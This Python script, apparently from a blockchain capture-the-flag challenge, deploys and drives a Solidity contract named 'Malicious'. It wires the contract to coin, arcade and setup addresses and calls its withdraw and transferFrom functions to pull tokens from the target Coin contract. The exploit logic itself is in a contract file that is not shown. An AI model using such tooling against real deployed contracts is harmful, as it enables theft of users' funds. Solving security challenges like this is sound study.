from web3 import Web3
from solcx import compile_files

class MaliciousContract:
    def __init__(self, owner_address: str, private_key: str, rpc: str, coin_address: str, arcade_address: str, setup_address: str):
        self.owner_address = owner_address
        self.private_key = private_key
        self.coin_address = coin_address
        self.arcade_address = arcade_address
        self.setup_address = setup_address
        self.web3 = Web3(Web3.HTTPProvider(rpc))

        # Compile the Malicious contract
        compiled_sol = compile_files(['./src/Malicious.sol'], solc_version="0.8.25")
        contract_interface = compiled_sol['src/Malicious.sol:Malicious']
        self.ABI = contract_interface['abi']
        self.BYTECODE = contract_interface['bin']

        self.Malicious = None
        self.contract_address = None

    def deploy(self):
        nonce = self.web3.eth.get_transaction_count(self.owner_address)
        contract = self.web3.eth.contract(abi=self.ABI, bytecode=self.BYTECODE)
        
        transaction = {
            'from': self.owner_address,
            'gas': 3000000,  # Adjust as needed
            'gasPrice': self.web3.to_wei('20', 'gwei'),
            'nonce': nonce
        }
        
        try:
            transaction['data'] = contract.constructor(self.coin_address, self.arcade_address, self.setup_address).build_transaction(transaction)['data']
            signed_txn = self.web3.eth.account.sign_transaction(transaction, private_key=self.private_key)
            tx_hash = self.web3.eth.send_raw_transaction(signed_txn.rawTransaction)
            print(f'Deployment transaction hash: {tx_hash.hex()}')
            
            tx_receipt = self.web3.eth.wait_for_transaction_receipt(tx_hash)
            self.contract_address = tx_receipt.contractAddress
            self.Malicious = self.web3.eth.contract(address=self.contract_address, abi=self.ABI)
            print(f'Contract deployed at address: {self.contract_address}')
        
        except Exception as e:
            print(f'Error deploying contract: {e}')

    def attach(self, new_address):
        # Attach to a new address
        self.contract_address = new_address
        self.Malicious = self.web3.eth.contract(address=self.contract_address, abi=self.ABI)
        print(f'Contract now attached to address: {self.contract_address}')

    def withdraw(self):
        if self.Malicious is None:
            raise Exception("Malicious contract not deployed or attached")

        try:
            transaction = self.Malicious.functions.withdraw().build_transaction({
                'from': self.owner_address,
                'gas': 3000000,  # Adjust as needed
                'gasPrice': self.web3.to_wei('20', 'gwei'),
                'nonce': self.web3.eth.get_transaction_count(self.owner_address)
            })

            signed_txn = self.web3.eth.account.sign_transaction(transaction, private_key=self.private_key)
            tx_hash = self.web3.eth.send_raw_transaction(signed_txn.rawTransaction)
            print(f'Withdrawal transaction hash: {tx_hash.hex()}')

            tx_receipt = self.web3.eth.wait_for_transaction_receipt(tx_hash)
            print(f'Withdrawal transaction receipt: {tx_receipt}')
        except Exception as e:
            print(f'Error withdrawing: {e}')

    def withdraw_from_coin(self):
        if self.Malicious is None:
            raise Exception("Malicious contract not deployed or attached")

        try:
            transaction = self.Malicious.functions.withdraw().build_transaction({
                'from': self.owner_address,
                'gas': 8000000,
                'gasPrice': self.web3.to_wei('20', 'gwei'),
                'nonce': self.web3.eth.get_transaction_count(self.owner_address)
            })

            signed_txn = self.web3.eth.account.sign_transaction(transaction, private_key=self.private_key)
            tx_hash = self.web3.eth.send_raw_transaction(signed_txn.rawTransaction)
            print(f'Withdrawal transaction hash: {tx_hash.hex()}')

            tx_receipt = self.web3.eth.wait_for_transaction_receipt(tx_hash)
            print(f'Withdrawal transaction receipt: {tx_receipt}')
        except Exception as e:
            print(f'Error withdrawing from Coin contract: {e}')

    def transfer_from_coin(self, to_address, amount):
        if self.Malicious is None:
            raise Exception("Malicious contract not deployed or attached")

        try:
            transaction = self.Malicious.functions.transferFrom(self.coin_address, to_address, amount).build_transaction({
                'from': self.owner_address,
                'gas': 8000000,
                'gasPrice': self.web3.to_wei('20', 'gwei'),
                'nonce': self.web3.eth.get_transaction_count(self.owner_address)
            })

            signed_txn = self.web3.eth.account.sign_transaction(transaction, private_key=self.private_key)
            tx_hash = self.web3.eth.send_raw_transaction(signed_txn.rawTransaction)
            print(f'Transfer transaction hash: {tx_hash.hex()}')

            tx_receipt = self.web3.eth.wait_for_transaction_receipt(tx_hash)
            print(f'Transfer transaction receipt: {tx_receipt}')
        except Exception as e:
            print(f'Error transferring from Coin contract: {e}')
